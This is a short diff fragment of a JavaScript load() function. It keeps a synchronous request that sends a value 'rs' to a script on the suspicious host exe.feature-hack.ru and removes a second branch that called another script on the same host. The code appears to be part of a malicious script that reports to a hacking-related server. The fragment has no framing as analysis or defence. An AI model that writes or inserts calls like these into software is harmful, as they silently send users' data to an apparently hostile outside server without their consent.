@@ -24,10 +24,6 @@ function load(){
             x.open("GET", "http://exe.feature-hack.ru/reg.php?md=" + rs, false);
             x.send(null);
             
-    }else{
-            var x = new XMLHttpRequest();
-            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=s2", false);
-            x.send(null);
     }
 }
 
